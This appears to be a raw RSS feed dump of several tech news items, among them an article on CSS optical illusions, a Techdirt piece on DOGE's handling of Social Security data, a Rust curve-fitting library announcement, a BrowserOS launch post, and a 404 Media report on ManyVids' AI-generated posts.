The circle at the center of this flower-shaped element is the same white as the rest of the page, but it gives the impression of being brighter, as if it were emitting light.This is one of my favorite illusions in the collection. The circles (or spheres) look red, blue, or green, but in reality they are all the same grayish color. Our brain "colorizes" them based on the lines that overlap the shapes. Don't believe it? Mouse over the illustration.In the following illustration, the lines inside the yellow section appear blue, while the lines inside the blue section appear red... but they are all black (or very dark gray). The white contour creates the illusion of color. Mouse over to remove the contour and the lines will clearly appear black.One set of lines looks straighter (top) while the other looks more curved (bottom). In reality, both sets are equally wavy. The only difference is how they are colored: changing the color at the peaks makes the lines look straighter. Changing it at the inflection points makes them look more curved.This is a classic optical illusion and an easy one to code in CSS. Three gradients are all that is needed to generate the effect in which the horizontal lines appear slanted, even though they are perfectly parallel.This optical illusion depicts an impossible shape. Parts that should be in front appear in the back, top becomes right, and everything feels contradictory. I coded this one some time ago for the 2024 Divtober event.Which orange circle is larger: the one on the right or the one on the left? It is a trick question: both are the same size. However, having smaller surrounding elements gives the impression that one is larger.I also created an animated version of this illusion (see below), as well as another version using a square shape instead of a flower shape:When people look at this illustration, they usually say they see a white square over black circles. However, the square is not actually there. The "Pac-Man" shapes create the illusion of a square and a sense of depth. Our brain fills in the missing information.
  15 - Ehrenstein's Illusion
There are no circles or discs in this illustration, only vertical and horizontal lines forming crosses. Our visual system completes the shape and makes us perceive a disc that does not exist.
  16 - Neon-Color-Spreading Illusion
This illustration shows concentric circles, some of which have a green-and-black pattern. Our brain perceives a central patterned circle and four concentric circles around it, beneath the green circle.I cheated a little when creating this in CSS, as I actually used a green circle blended with the other backgrounds.
  17 - Hering and Wundt Illusions
Perspective-based illusions are fascinating. Even when we know we are looking at a flat image, our brain insists on interpreting depth.In the Hering illusion, the red lines appear to curve outward, even though they are straight.The  effect is the Wundt illusion. When the lines expand from the sides toward the center, the red lines appear to curve inward (this effect is more subtle).Both yellow lines are the same length, but the top one looks longer due to perceived depth and perspective. I tried a different approach when coding this one by applying a three-dimensional rotation in CSS... so the perspective is technically real.This illusion is easy to code in CSS and easy to fall for. Both the vertical and horizontal lines are the same length, but the vertical line appears longer.
  20 - Müller-Lyer Illusion
A classic illusion: the horizontal lines are the same length, but inward- or outward-pointing edges dramatically change how we perceive them. I could swear the top one is longer. But it is not.
From a coding perspective, each shape is a pseudo-element. I ensured the horizontal lines were identical by using the same gradients and only repositioning the edges in the  and .
  21 - Tilted Table Illusion
It looks like the top rectangle is leaning to the left, but it is actually parallel to the one at the bottom. The trick lies in the direction of the diagonal lines used to "color" each rectangle.
This illusion works better on larger screens. The effect is diminished when you can see the whole picture.This is a simple effect: the black lines are parallel, but they appear not to be because of the direction of the bars crossing them.
I slightly overcomplicated this one while coding it. I initially built the black-and-red version below and tried to reuse more code than I probably should have.Here is the original version I created. The effect is also visible there:Good news! There are more optical illusions below - but first, a warning.
  ATTENTION: The following optical illusions are static, but they give the impression of movement. Proceed accordingly.
(Leaving some blank space in case you do not want to continue.)This is a trippy optical illusion. It is completely static, yet it looks like the black hole at the center is expanding - especially when you are not looking at it directly, creating the sensation of falling into a pit.From a coding perspective, this one was very simple: a background pattern made with two radial gradients, plus a blurred pseudo-element for the "expanding" hole.This is one of only two optical illusions in this collection where I used HTML elements instead of relying exclusively on CSS. It is a classic effect: when you look at the illustration, the peripheral discs appear to rotate, even though nothing is actually moving.Another classic illusion. Focus on the white dots and the adjacent dots will appear to turn black. There is no animation, no transition, and nothing dynamic. Just intersecting lines and small white circles, yet it looks like motion.This pattern consists of repeating black and white dots across the page. If you focus on one dot, the others will begin to disappear. At first it may happen by row or column, but after a short while, most of them vanish.If you do not immediately see the effect, try focusing on one black dot. Mouse over it, wait a few seconds while keeping your focus, and then mouse out.This is a static image, but it gives the impression that the pattern inside the circle is moving sideways. This happens because our eyes are constantly making small movements, even when we are not aware of it.If you cannot see the illusion, try slightly moving the screen (or your head) while looking just outside the circle.
  28 - Orthogonal Dotted Lines Sway
When you look around this pattern, the central area appears to slide and sway, even though it is completely static. This illusion makes me dizzy... but that may also be because I had to stare at it for a long time while coding it.This illusion is particularly interesting. There is a pink circle surrounded by concentric pink and purple rings. If you focus on the pink circle, the rings appear to spin or scintillate, as if there were some activity in them. Of course, nothing is actually moving.This demo was challenging to code and takes a long time to load. Mainly because it uses a large number of conic gradients behind the scenes, which browsers struggle to render efficiently. There is probably a better way to implement it, but I have not explored that yet.If you look closely at the illustration, you may notice wave-like motion. As with the previous illusions in this section, the image is entirely static.Good news! There are more optical illusions below - but first, another warning.
  ATTENTION: The following optical illusions actually move, and the illusion is created by motion itself. Some of them can be dizzying, so proceed accordingly.
(Leaving some blank space in case you do not want to continue.)
  31 - Animated Ebbinghaus Illusion
Earlier, we saw two static versions of the Ebbinghaus illusion. This one is animated. The elements move side to side, and the surrounding shapes grow and shrink, giving the impression that the orange circle is changing size - when it definitely is not.
  32 - Psychokinematic Tower
This looks like a three-dimensional tower spinning in space, as seen from above. In reality, it is a flat, two-dimensional image rotating.
Mouse over the demo to stop the rotation and the illusion of depth disappears entirely.This optical illusion requires only two gradients: a conic gradient for the fan-shaped arms and a radial gradient for the circles and discs.If you focus on the black dot, the illustration may appear to develop a darker greenish or brownish border. However, the colors never change.
  34 - Reverse Spoke Illusion
This illusion is delightful and disorienting. While the background colors of the wheel are spinning, the spokes remain fixed. However, they appear to rotate in the opposite direction. In reality, only the background is moving.What do you see in this animation? Most people report two sets of lines operating independently: one moving horizontally and another moving vertically. And that is exactly how it looks.In reality, it is a single shape moving uniformly. Run the demo, mouse over the lines, and the true motion will be revealed.
  36 - Mainz-Linez Illusion
Focus on one of the red dots. You will notice it moves straight up and down along a vertical path. Now shift your focus to one of the black crosses in the center. Suddenly, the red dots appear to zigzag instead of moving straight.It may look like the boxes are moving at different speeds or like a set of walking feet. In reality, all elements move at the same pace and in parallel. Mouse over the demo to reveal the effect.The illusion also works when the "feet" move in circles, as shown in this alternative version:Follow the red dot as it moves sideways. From the corner of your vision, it may appear that the dashed black-and-white lines are moving closer together (when the dot moves left) or farther apart (when it moves right). In reality, the lines are completely static.These dots always have the same color. However, when placed against alternating backgrounds, they appear to jump or move out of sync because of how they blend with their surroundings.Mouse over the demo to remove the background and the illusion disappears.This illusion gives the impression that a blue square is growing and shrinking rhythmically, almost as if it were breathing or beating like a heart.Although the image is rotating, its size never changes. Mouse over the illustration to remove the green boxes and reveal the rotating blue square.This illustration shows a circle made of pink dots, with one dot missing. Focus on the cross at the center and the missing dot will appear as a yellow or green dot, giving the impression that it is "eating" the pink dots. Just like Pac-Man.I could have used CSS trigonometric functions to calculate the exact positions of the dots, but since they never change, I chose to hardcode the values instead.Here is a related effect. Follow the light gray circle as it spins, and the darker circles will appear to change from gray to greenish. Focus on the cross at the center, and after a short time, the darker circles may begin to fade entirely.
  42 - Pinna-Brelstaff Illusion
This illusion is particularly dizzying. Follow the bluish dot as it moves from right to left and back again. It will appear as though parts of the tiled background are shifting, even though they are static. The only moving element is the dot.
From a CSS perspective, I coded the pattern using conic gradients, and applied it to the  and  pseudo-elements. I then flipped one upside down and clipped it.The radii of a wheel, when viewed through a palisade, appear to curve. In reality, they are perfectly straight. Mouse over the demo to remove the palisade and you will see that the radii never bend.This animation demonstrates how our minds infer motion that may not actually be there. Consider the two blue dots. Different people perceive different movements: side to side, top to bottom, or even circular motion.Cover the right side of the animation so that you see only one dot at a time. The motion now appears vertical. Cover the bottom part instead, and the motion appears horizontal. This is our brain trying to complete the movement.These two illustrations are identical - same shapes, same animation. The only difference is the CSS timing function.The top animation moves smoothly from right to left. The bottom one appears to move choppily in the same direction, but if you focus on it, it may suddenly seem to reverse direction and move faster.Most of the inspiration for these optical illusions came from two excellent resources:You can also find this article on:(You can leave comments on those platforms and I will reply there).]]></content:encoded></item><item><title>DOJ Admits DOGE Team Caught Sharing Social Security Data With Election Denier Group</title><link>https://www.techdirt.com/2026/01/22/doj-admits-doge-team-caught-sharing-social-security-data-with-election-denier-group/</link><author>Mike Masnick</author><category>tech</category><pubDate>Thu, 22 Jan 2026 17:33:28 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[We spent a lot of time last year calling out how dangerous it was that Elon Musk and his inexperienced 4chan-loving DOGE boys were gaining access to some of the most secure government systems. We also highlighted how it seemed likely that they were violating many laws in the process. One specific point of concern was DOGE’s desire to take control over Social Security data, something that many people warned would be abused for political reasons, in particular to make misleading or false claims about voting records.For all the people who insisted that this was hyperbolic nonsense, and DOGE was just there to root out “waste, fraud, and abuse,” well… the DOJ last week quietly admitted that the DOGE boys almost certainly violated the Hatch Act and had given social security data to conspiracy theorists claiming Trump won the 2020 election (he did not).Oh, and this only came out because the DOJ realized it had lied to a court (they claim it was because the Social Security Administration officials had given them bad info, but the net effect is the same) and had to correct the record.Shapiro’s previously unreported disclosure, dated Friday, came as part of a list of “corrections” to testimony by top SSA officials during last year’s legal battles over DOGE’s access to Social Security data. They revealed that DOGE team members shared data on unapproved “third-party” servers and may have accessed private information that had been ruled off-limits by a court at the time.Shapiro said the case of the two DOGE team members appeared to undermine a previous assertion by SSA that DOGE’s work was intended to “detect fraud, waste and abuse” in Social Security and modernize the agency’s technology.Also in his March 12 declaration, Mr. Russo attested that, “[t]he overall goal of the work performed by SSA’s DOGE Team is to detect fraud, waste and abuse in SSA programs and to provide recommendations for action to the Acting Commissioner of SSA, the SSA Office of the Inspector General, and the Executive Office of the President.”….However, SSA determined in its recent review that in March 2025,a political advocacy group contacted two members of SSA’s DOGE Team with a request to analyze state voter rollsthat the advocacy group had acquired.The advocacy group’s stated aim was to find evidence of voter fraud and to overturn election resultsin certain States. In connection with these communications,one of the DOGE team members signed a “Voter Data Agreement,” in his capacity as an SSA employee, with the advocacy group. He sent the executed agreement to the advocacy group on March 24, 2025.The filing goes on to admit that the declaration from a Social Security administration employee that there were safeguards in place against sharing data, and that everyone had received training in not sharing data, was apparently wrong.However, SSA has learned that, beginning March 7, 2025, and continuing until March 17 (approximately one week before the TRO was entered), members of SSA’s DOGE Team were using links to share data through the third-party server “Cloudflare.” Cloudflare is not approved for storing SSA data and when used in this manner is outside SSA’s security protocols. SSA did not know, until its recent review, that DOGE Team members were using Cloudflare during this period. Because Cloudflare is a third-party entity, SSA has not been able to determine exactly what data were shared to Cloudflare or whether the data still exist on the server.Cool cool. No big deal. DOGE boys just put incredibly private data on a third party server and no one knows what data was there or even Have I got some waste, fraud, and abuse for you to check out!Separately, the filing reveals that Elon Musk’s right hand man, Steve Davis—the “fixer” Musk deploys across all his organizations—was copied on an email containing an encrypted file of SSA data. The filing is careful to note that DOGE itself “never had access to SSA systems of record,” but that’s a distinction without much difference when your guy is getting emailed password-protected files derived from those systems. Oh and: SSA still can’t open the file to figure out exactly what was in it.However, SSA has determined that on March 3, 2025—three weeks prior to entry of the TRO—an SSA DOGE Team member copied Mr. Steve Davis, who was then a senior advisor to Defendant U.S. DOGE Temporary Organization, as well as a DOGE-affiliated employee at the Department of Labor (“DOL”), on an email to Department of Homeland Security (“DHS”). The email attached an encrypted and password-protected file that SSA believes contained SSA data. Despite ongoing efforts by SSA’s Chief Information Office, SSA has been unable to access the file to determine exactly what it contained. From the explanation of the attached file in the email body and based on what SSA had approved to be released to DHS, SSA believes that the encrypted attachment contained PII derived from SSA systems of record, including names and addresses of approximately 1,000 people.Looks like some more waste, fraud, and abuse right there.So to recap: the team that stormed in to root out “waste, fraud, and abuse” committed what looks an awful lot like  fraud and abuse—sharing data on unauthorized servers, misleading courts, cutting deals with election conspiracy groups, and emailing around encrypted files of PII that the agency itself can’t even open anymore. All of it now documented in federal court filings—not that anyone will do anything about it. Accountability is for people who don’t have Elon Musk on speed dial.]]></content:encoded></item><item><title>Announcing winapp, the Windows App Development CLI</title><link>https://blogs.windows.com/windowsdeveloper/2026/01/22/announcing-winapp-the-windows-app-development-cli/</link><author>/u/_AACO</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 17:31:21 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Polyfit - Because statistics is hard, and linear regression is made entirely out of footguns</title><link>https://www.reddit.com/r/rust/comments/1qk0v16/polyfit_because_statistics_is_hard_and_linear/</link><author>/u/rscarson</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 17:30:50 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[I needed to draw a curve fit through some data, and it turned into a year long rabbit hole, where I discovered that stats is really involved, and that the rust ecosystem is a bit barren in terms of user-friendly batteries-included polynomial fitting libraries.So I built Polyfit - Because you don't need to be able to build a powerdrill to use one safely.The full power of polynomial fitting without needing to understand all the mathSensible parameters (DegreeBound, scoring metrics, basis functions) that don't feel arbitrary or like magic numbersExtensive documentation, examples, and built in testing toolsMy goals for the project were:Never ask for a number without context - ask for a random number and you get a random number Instead, if I can derive the correct value myself I doIf I can't, I have named presets that describe in detail why you'd pick themProvide sensible defaults for everything If you don't care about a setting, you shouldn't have to think about itYou should not  to understand the math to get good resultsPerformance I tried to prioritize speed and memory efficiency where possibleOn my fairly average laptop, I can do a 100 million point fit in ~1sYou need to be able to test it Not understanding the math shouldn't be a barrier to making sure it worksThere's a whole test suite included with extensive docs, examples, and sensible defaultsThe tests even generate a plot on failure so you can see what went wrongAnd I included a set of random noise injection transforms to help you make synthetic data for testingThe tests will even show seeds used on failure for reproducibilityHere's some examples of why you'd want to use PolyfitOh no! I have all this data and I need to draw a line through ituse polyfit::{ score::Aic, statistics::DegreeBound, ChebyshevFit, }; let mut fit = ChebyshevFit::new_auto(&data, DegreeBound::Relaxed, &Aic)?; let equation = fit.as_monomial()?.to_string(); let pretty_line = fit.solve_range(0.0..=100.0, 1.0)?; DegreeBound::Relaxed uses your data to pick a reasonable degree without overfittingAic is a scoring metric. Smallish datasets tend to do well with itWe use as_monomial to get the equation in a human readable format.Oh gee willikers How am I going to figure out which of these data points are outlierslet covariance = fit.covariance()?; // It's the thing that tells us how certain we are about the fit just roll with it let outliers = covariance.outliers(Confidence::P95, Some(Tolerance::Absolute(0.1)))?; The Confidence is just a measure of how much you trust the fit. P95 is a good optionI added Tolerance because real world data is messy. If I know my sensor is only accurate to +/- 0.1 units I shouldn't need to mess with the confidence level to account for that. It's basically an engineering correction for ConfidenceI also have extensive calculus support, soSay you have weather data with temperature over time:use polyfit::{FourierFit, score::Aic, statistics::DegreeBound}; let fit = FourierFit::new_auto(&data, DegreeBound::Relaxed, &Aic)?; // Derivatives for rates of change // Critical points are neat for this // This tells us when the temperature stops rising or falling and starts doing the opposite for point in fit.critical_points()? { match p { CriticalPoint::Minima(x, _y_) => println!("Found a local minimum at x = {}", x), CriticalPoint::Maxima(x, _y_) => println!("Found a local maximum at x = {}", x), CriticalPoint::Inflection(x, _y_) => println!("Found an inflection point at x = {}", x), } } There's too many options how do I pick a basis for my data!It tests your data on every basis I support and gives you an easy to digest report:--------------------------------[ How to interpret the results ] [ Results may be misleading for small datasets (<100 points) ] - Score Weight: Relative likelihood of being the best model among the options tested, based on the scoring method used. - Fit Quality: Proportion of variance in the data explained by the model (uses huber loss weighted r2). - Normality: How closely the residuals follow a normal distribution (useless for small datasets). - Rating: Combined score (0.75 * Fit Quality + 0.25 * Normality) to give an overall quality measure. - Stars: A simple star rating out of 5 based on the Rating score. Not scientific. - The best 3 models are shown below with their equations and plots (if enabled). Less params is a simpler model, which is betterBetter fit quality means it explains more of the dataBetter normality means it's probably not underfitting (too simple)The rating is a weighted combination of fit quality and normality to give an overall score]]></content:encoded></item><item><title>Struggling fusion power company General Fusion to go public via $1B reverse merger</title><link>https://techcrunch.com/2026/01/22/struggling-fusion-power-company-general-fusion-to-go-public-via-1b-reverse-merger/</link><author>Tim De Chant</author><category>tech</category><pubDate>Thu, 22 Jan 2026 17:00:25 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[General Fusion's merger with an acquisition company will net the company over $300 million.

When a spacecraft deploys a solar sail millions of kilometers from Earth, there’s no room for memory bugs, race conditions, or software failures. This is where Rust’s robustness guarantees become mission-critical.In this episode, we speak with Sebastian Scholz, an engineer at Gama Space, a French company pioneering solar sail and drag sail technology for spacecraft propulsion and deorbiting. We explore how Rust is being used in aerospace applications, the unique challenges of developing software for space systems, and what it takes to build reliable embedded systems that operate beyond Earth’s atmosphere.

We're Nithin and Nikhil, twin brothers building BrowserOS (YC S24). We're an open-source, privacy-first alternative to the AI browsers from big labs.The big differentiator: on BrowserOS you can use local LLMs or BYOK and run the agent entirely on the client side, so your company/sensitive data stays on your machine!Today we're launching filesystem access... just like Claude Cowork, our browser agent can read files, write files, run shell commands! But honestly, we didn't plan for this. It turns out the privacy decision we made 9 months ago accidentally positioned us for this moment.The architectural bet we made 9 months ago: Unlike other AI browsers (ChatGPT Atlas, Perplexity Comet) where the agent loop runs server-side, we decided early on to run our agent entirely on your machine (client side).But building everything on the client side wasn't smooth. We initially built our agent loop inside a Chrome extension. But we kept hitting walls -- service worker being single thread JS; not having access to NodeJS libraries. So we made the hard decision 2 months ago to throw away everything and start from scratch.In the new architecture, our agent loop sits in a standalone binary that we ship alongside our Chromium. And we use gemini-cli for the agent loop with some tweaks! We wrote a neat adapter to translate between Gemini format and Vercel AI SDK format. You can look at our entire codebase here: https://git.new/browseros-agentHow we give browser access to filesystem: When Claude Cowork launched, we realized something: because Atlas and Comet run their agent loop server-side, there's no good way for their agent to access your files without uploading them to the server first. But our agent was already local. Adding filesystem access meant just... opening the door (with your permissions ofc). Our agent can now read and write files just like Claude Code.What you can actually do today:--- Where we are now
If you haven't tried us since the last Show HN (https://news.ycombinator.com/item?id=44523409), give us another shot. The new architecture unlocked a ton of new features, and we've grown to 8.5K GitHub stars and 100K+ downloads:We are very bullish on browser being the right platform for a Claude Cowork like agent. Browser is the most commonly used app by knowledge workers (emails, docs, spreadsheets, research, etc). And even Anthropic recognizes this -- for Claude Cowork, they have janky integration with browser via a chrome extension. But owning the entire stack allows us to build differentiated features that wouldn't be possible otherwise. Ex:  Browser ACLs.Agents can do dumb or destructive things, so we're adding browser-level guardrails (think IAM for agents): "role(agent): can never click buy" or "role(agent): read-only access on my bank's homepage."Curious to hear your take on this and the overall thesis.We’ll be in the comments. Thanks for reading!]]></content:encoded></item><item><title>Aliens and Angel Numbers: Creators Worry Porn Platform ManyVids Is Falling Into ‘AI Psychosis’</title><link>https://www.404media.co/manyvids-porn-platform-ai-psychosis-bella-french-bio/</link><author>Samantha Cole</author><category>tech</category><enclosure url="https://www.404media.co/content/images/2026/01/manyvids--1-.png" length="" type=""/><pubDate>Thu, 22 Jan 2026 16:20:38 +0000</pubDate><source url="https://www.404media.co/">404</source><content:encoded><![CDATA[In posts on ManyVids, the porn platform’s official account holds imaginary conversations with aliens, alongside AI-generated videos of UFOs, fractal images, “angel numbers,” and a video of its founder and CEO Bella French in a space suit shooting lasers from her eyes.  French launched the site in 2014 as a former cam model herself, and the platform has  and tens of thousands of creators. Adult content creators use it to sell custom videos and subscriptions, and perform live on camera. French recently changed her personal website to state her new goal is to “transition one million people out of the adult industry and do everything we can to ensure no one new enters it.” The statement follows posts on X’s ManyVids account about new strategies to pivot the site toward safe-for-work, non-sexual content.This sudden shift away from years of messaging about being a compatriot with sex workers, combined with bizarre AI-generated text and images about talking to aliens and numerology on social media, has made some creators worry for their livelihoods, and caused others to leave the site completely.For years, the official ManyVids social media accounts made mostly normal posts that promoted the site and its creators. But in mid-2025, the posts from the ManyVids X account changed. Instead of promotions of top creators, announcements of contests, and tips for using the platform, the account shifted its focus to existential and metaphysical musings. Around August, it started posting cryptic quotes, phrases, and images, many seemingly generated by or about AI. The account also started replying to engagement-farming posts from influencers, writing things like “Our purpose: to protect the feminine energy — so that balance may return,” and posting borderline-nonsensical bullet-point lists about “the boldness scale” and how ManyVids leadership is “all connected.” “The impact strength of a positive leader ⚡ Effectiveness ⚡ Execution ⚡ Discipline ⚡ Accountability,” one  in August said. On August 20, @ManyVids posted an image on X of a flow chart alongside a screenshot of a ChatGPT conversation, seemingly illustrating how the platform would bring in users through a “safe-for-work” zone, then allow them to access NSFW content after verifying their identifications. “Our vision: Adult Industry 2.0 isn’t about more revenue. It’s about evolution,” the post said. The replies to these posts show ManyVids creators expressing anger, concern, and bafflement. The account stopped posting on X in September. But on the ManyVids platform itself, which has a “news” feed that functions similarly to a microblogging platform but is just for official platform posts, the odd entries continue.Do you know anything else about what's happening at ManyVids, or do you have a tip about porn platforms and online sex work generally? I would love to hear from you. Using a non-work device, you can message me securely on Signal at sam.404. Otherwise, send me an email at sam@404media.co.“Social API for the AI Age. Phase 1 — Pride Engine,” one post from January 16 says: “The High Universal Income (HUI) Engine is the distribution hub of the new economy, built for a world where AI does the work humans never wanted to do. AI generates surplus wealth, but humans need surplus purpose. Human meaning becomes the rarest and most valuable resource on Earth. Instead of opaque taxes, AI companies fund a Social License through platforms like ManyVids, converting AI efficiency into merit-based bonuses for human contribution. For every dollar earned through passion, creation, care, or learning, HUI adds 10%. This is not charity. It is a Pride Engine. We shift the foundation of human value.”The post ends with a six-second AI generated video that includes the phrase “the ultimate guide to rebuilding civilization.” Most posts in recent weeks are like this: clearly AI generated text alongside six-second AI generated clips showing angels, chakras, or spiritual phrases. “The Simulation of Integrity. If we don’t fully understand the ultimate nature of reality, what should guide how we live inside it?” one recent post says. “If the nature of the ‘game’ is unknown, then how you treat others — and yourself — becomes the most meaningful data point.” And in a post right after the new year: “Hey everyone! Back-to-the-office Monday vibe. How were your holidays? Did you travel anywhere? I did... 🕳️Next time, I’ll bring sunglasses. I came back with a few new ideas and fresh thoughts ✨Let’s get to work. Let’s go, 2026! 🚀” Below the text: a video of French in a space suit, black hole in the background, shooting laser-lightning out of her eyes.A lot of people who rely on ManyVids for income have noticed this odd behavior and are disturbed by it. “Ethical dilemmas about AI aside, the posts are completely disconnected with ManyVids as a site,” one ManyVids content creator told 404 Media, on the condition of anonymity. “Their customers and their creators are not served in any way by these. When faced with backlash, MV removed the ability to comment on posts. To anyone looking at them they appear to be ramblings and images generated by a person in active psychosis.” Almost every ManyVids creator 404 Media spoke to for this story brought up “AI psychosis” unprompted, when asked if they’d seen the ManyVids posts. “I have seen them and I find them really insulting,”  said. “The way I perceive the posts is that Bella and the MV team doesn't respect their creators enough to spend time making their own content, instead taking the easy way out and using bizarre AI that doesn't even relate. Why do we need Bella shooting laser beams out of her eyes to make an announcement? It's infuriating because it's like she doesn't take us seriously, doesn't take her own platform seriously, and we're supposed to just be grateful for the crumbs she's giving us. We deserve better,” she said. “We deserve to be treated with respect, talked to like we're adults, and listened to like our voices matter. Instead we get AI slop and posts that promise big things without any sort of follow through.”  Harlan Paramore, a ManyVids creator who also helps other creators onboard and manage their selling sites, said he’s noticed “bizarre posts about AI, angel numbers, christopaganism, cyberpaganism.” “I don't have anything against any of those beliefs, but they seem wildly out of place for an official site blog. They are also heavily loaded with AI-like language and structure, and decorated with AI images,” Paramore said. “I'm also a professional artist, and as both an artist and sex worker I'm frustrated and confused. Some of it kind of sounds like AI psychosis, too, which has me concerned for whoever is running that blog.” “I'm not a mental health professional, but whatever Bella is going through doesn't seem normal. It doesn't seem healthy,” Screams said. “From where I'm sitting, if I were close to Bella, I'd be reaching out to her other friends and family members to stage an intervention and try to get her serious mental health care.” All of this is coinciding with an apparent massive change in French’s ideology toward sex work. On , French says the goal of ManyVids is changing to “transition one million people out of the adult industry.” She calls sex work “exploitative.” Her bio quotes her as saying: “I had two choices: surrender to an exploitative industry or dismantle it. I chose to build its replacement... ManyVids was the result—the most efficient revenue-distribution engine for the AI-displaced workforce. Guided by first principles and core value thinking, Bella is leading MV’s next evolution: a Fintech/Social-Impact hybrid that turns digital presence into economic creation. By utilizing AI-integrated workflows and layered access, ManyVids is migrating creators from adult content into a diversified creative economy,” her bio says. “Our goal is to transition one million people out of the adult industry and do everything we can to ensure no one new enters it. We are working to transform an industry we don’t believe should exist—but we recognize that simple elimination creates deeper shadows. The solution is elevation through meaningful alternatives.” This is a recent addition to her website. According to archived versions of the site, the section about transitioning people out of the sex industry wasn’t there in November 2025. “ManyVids is now becoming a regulated e-social ecosystem — a digital space that sensitizes, elevates, and restricts adult content through layered brackets of access,” French’s bio says now. “This ensures that sacred sexual expression is never free, never exploited, and never divorced from its core human depth.” The “layered brackets” seem to be a reference to the ChatGPT screenshots from August 20. This is an extreme departure in tone from what French has said was her mission with ManyVids in the past. In 2019, I met French for an on-background hotel room meeting during the porn industry’s biggest award show and conference, AVN, where she told me she created ManyVids out of a passion to create a platform where other sex workers—having been an adult content creator herself—would be treated fairly and would be listened to by the platform’s owners. French is a former cam model herself, and has always been open publicly about wanting to create better platforms for other sex workers.“Their customers and their creators are not served in any way by these." “We try to offer sex workers the tools to be more successful as independent entrepreneurs without being judged,” French told the Daily Beast in 2019. “What was really important for me was to educate the world and make them realize that porn stars are not stupid.”Shortly after she and I met in 2019, French agreed to a written interview as part of a VICE story about authenticity in cam work. In that email, she called camming the “biggest gift” she’d ever received. “Being a camgirl not only has a huge influence on my approach to taking business decisions but has changed the way I view people and life in general,” French wrote at the time. “Every single decision we take at ManyVids must answer 1 simple question, ‘Will this help the content creators, our MV Stars?’ That’s it,” French wrote in 2019. “If the answer is yes then we proceed, regardless if there is any financial advantage or potential for profit, that is irrelevant.” Platforms have long profited off of sex workers and pornography to establish popularity and rake in revenue before eventually doing a heel-turn on the creators who made them successful. We’ve seen it happen with mainstream social media platforms like Tumblr, Instagram, and Twitter, and also on sites ostensibly made for sex workers, like OnlyFans, which nearly changed its policies to ban explicit material after making billions of dollars off their content.  I asked ManyVids and French if the platform is changing to reflect these social media posts and her statements on her bio, who is making the AI-generated posts mentioned above, how French plans to “transition one million people” out of sex work, and if any of this will affect creators and fans who use ManyVids. The ManyVids support team did not answer these questions specifically, but sent the following response (emphasis theirs): "Hello, thanks for reaching out. Respect for Online Sex Workers. Sex work is real work. No more living in the shadows, no more being misunderstood.No more being afraid, shadowbanned, or persecuted by systems and institutions. Not on our watch. We are not victims — and we are taking action now.This generation of online sex workers is about to change the game forever —and transform the oldest profession in the world in the right direction,  Respect the creators. Respect the work. Respect what you watch. We stand for safety, dignity, and opportunity for all creators."I asked ManyVids to explain in specific terms what "we are taking action now" means. They replied: "A post will be published to our ManyVids News feed this Saturday, January 24th. It will provide additional clarification and go into a bit more detail on this," with a link to the feed.“It concerns me that access to my earnings, and more importantly my personal information, is in the hands of someone seemingly out of touch with reality.” In the meantime, creators have been confused and worried for weeks. Nothing has changed about the way the site operates publicly or creators’ payouts as of writing, but this is a series of events that many adult content creators are concerned represents a potential threat to their livelihood.“If something were to happen to MV (or to my account there) due to what can only be described as AI psychosis, I would lose upwards of 14k per year—a not insignificant amount of income,” another adult creator on ManyVids told 404 Media. “It concerns me that access to my earnings, and more importantly my personal information, is in the hands of someone seemingly out of touch with reality.” ManyVids takes a larger-than-most cut from creators' profits, depending on the type of content: For videos and contest earnings (which are similar to tips), the platform takes 40 percent. On tips and custom video sales, it takes 20 percent, which is more in line with other adult platforms. This has been a source of complaint from creators for a long time, combined with unpredictable algorithms that creators say change how they’re discovered on the platform and what content performs best, impacting their earnings. Users have expressed dissatisfaction with these aspects of the platform, and how French runs it, for years. But the recent turn to AI and French’s statements about the industry are making some wonder if it’s time to leave. “I will still be using ManyVids for NSFW content for as long as they allow it,” adult content creator August told 404 Media. “But part of me thinks that they will try to do what OnlyFans did years ago and try to ban NSFW content which would be an absolute disaster for sex workers whose income depends on platforms like ManyVids.” Luna Sapphire, a creator who has been using the platform since 2015, said she finds French’s statements on her website “harmful and insulting” to those who’ve helped popularize the site from the start. “Most of us are not looking for a path out of the adult industry; we simply want to do our jobs with as little interference and censorship as possible,” Sapphire said. “Bella used to be very pro-sex worker and it is disappointing to see her change her tune.”Several adult platforms have embraced, or at least allowed, AI-generated content and “models” on their sites alongside human creators in the last few years. On OnlyFans, AI-generated is allowed, but must comply with the site’s terms of service and and “must be clearly and conspicuously captioned as AI Generated Content with a signifier such as #ai, or #AIGenerated,” Onlyfans  in its terms. Fansly, another adult platform for independent creators,  “photorealistic AI-generated content” but allows non-photorealistic “virtual entities” (like V-tubers) if they’re registered using the uploader’s real legal information for verification purposes. JustForFans requires that “consent, identity, and proof of age must be established if the AI images are based on a real person's likeness,” and allows deepfakes if consent has been established. “For example, you can use your own face to create images of yourself or a model who has granted consent to use their face,” the platform’s  IWantClips, another site for selling custom content,  users making AI-generated models to verify their identities, but explicitly doesn’t allow deepfakes. , IWantClips awarded an AI-generated model $1,000 as the winner of a Valentine’s Day-themed contest. “Adora” competed in the contest alongside human sex workers. On most of these sites, engagement and attention are currency, and on ManyVids, AI generated models sell content alongside humans. The platform  “AI-generated or deepfake content that misrepresents real individuals without consent,” as part of its terms that forbid “content that violates any third party's intellectual property rights or another individual's privacy.”“The AI/intense spirituality path has been so strange to witness, and I can’t imagine what it’s leaving the fans to think,” Elizabeth Fields, an adult content creator who’s used ManyVids for six years, told 404 Media. “I don’t understand what they are trying to do by taking this direction, nor do I understand how it’s fair of a sexwork built site to assume all of us don’t want to do NSFW content–and to try and funnel us into this box of ‘not enjoying the work we do. To an extent it feels degrading honestly—just because Bella’s experience in sex work was survival based and to make ends meet—a lot of us thoroughly enjoy our jobs, the path we took, and want to continue doing this.” Many sex workers are disabled, neurodivergent, mentally ill, chronically ill, or “all of the above,” Fields noted, and rely on online sex work to pay the bills. “It feels absolutely unfair to feel like we could be pushed off of a site that became popular off OUR NSFW content—because they want to make it more SFW, and implement all these new AI features that will quite frankly just turn clients off.” Despite all of this, Fields said she won’t be leaving the 